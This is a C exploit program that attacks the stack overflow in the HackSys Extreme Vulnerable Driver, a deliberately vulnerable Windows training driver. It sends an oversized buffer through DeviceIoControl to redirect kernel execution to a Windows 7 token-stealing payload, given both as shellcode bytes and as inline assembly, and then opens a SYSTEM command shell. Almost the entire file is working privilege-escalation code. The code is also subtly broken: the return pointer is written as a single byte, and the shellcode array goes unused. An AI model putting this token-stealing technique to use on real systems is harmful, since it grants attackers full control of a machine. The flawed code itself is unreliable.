#include <Windows.h>
#include <stdio.h>

// 2080 is the number of padding bytes, next 4 bytes will be the pointer.
BYTE inBuffer[2084] = { 0 };
BYTE shellcode[] = {
	"\x60"
	"\x31\xc0"
	"\x64\x8b\x80\x24\x01\x00\x00"
	"\x8b\x40\x50"
	"\x89\xc1"
	"\xba\x04\x00\x00\x00"
	"\x8b\x80\xb8\x00\x00\x00"
	"\x2d\xb8\x00\x00\x00"
	"\x39\x90\xb4\x00\x00\x00"
	"\x75\xed"
	"\x8b\x90\xf8\x00\x00\x00"
	"\x89\x91\xf8\x00\x00\x00"
	"\x61"
	"\x31\xc0"
	"\x5d"
	"\xc2\x08\x00"
};
char unused = 0;


// Function provided by HackSys Extreme Vulnerable Driver (HackSys Team)
void TokenStealingPayloadWin7() {
	// Importance of Kernel Recovery
	__asm {
		pushad; Save registers state

		; Start of Token Stealing Stub
		xor eax, eax; Set ZERO
		mov eax, DWORD PTR fs : [eax + 124h] ; Get nt!_KPCR.PcrbData.CurrentThread
		; _KTHREAD is located at FS : [0x124]

		mov eax, [eax + 50h]; Get nt!_KTHREAD.ApcState.Process
		mov ecx, eax; Copy current process _EPROCESS structure
		mov edx, 04h; WIN 7 SP1 SYSTEM process PID = 0x4

		SearchSystemPID:
			mov eax, [eax + 0B8h]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, 0B8h
			cmp[eax + 0B4h], edx; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID

			mov edx, [eax + 0F8h]; Get SYSTEM process nt!_EPROCESS.Token
			mov[ecx + 0F8h], edx; Replace target process nt!_EPROCESS.Token
			; with SYSTEM process nt!_EPROCESS.Token
			; End of Token Stealing Stub

			popad; Restore registers state

		; Kernel Recovery Stub
		xor eax, eax; Set NTSTATUS SUCCEESS
		add esp, 12; Fix the stack
		pop ebp; Restore saved EBP
		ret 8; Return cleanly
	}
}

int main(int argc, char** argv)
{
	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE /** Equivalent to (HANDLE)-1*/)
	{
		printf("[-] Failed to obtain a handle to the HackSysExtremeVulnerableDriver.");
		unused = getchar();
		return 0;
	}
	printf("[+] Obtained a handle to the HackSysExtremeVulnerableDriver. Value: 0x%p\n", hDriver);

	memset(&inBuffer, 'O', 2080);
	*(unsigned char*)(inBuffer + 2080) = &TokenStealingPayloadWin7;
	Sleep(1000);

	LPVOID outBuffer[1024] = { 0 };
	DWORD bytesReturned = 0;
	DeviceIoControl(hDriver, 0x222003, inBuffer, sizeof(inBuffer), &outBuffer, sizeof(outBuffer), &bytesReturned, NULL);
	printf("[+] Sent IO control code.\n");

	system("start C:\\Windows\\System32\\cmd.exe");
	printf("[+] Spawned SYSTEM shell.");
	unused = getchar();

	return 1;
}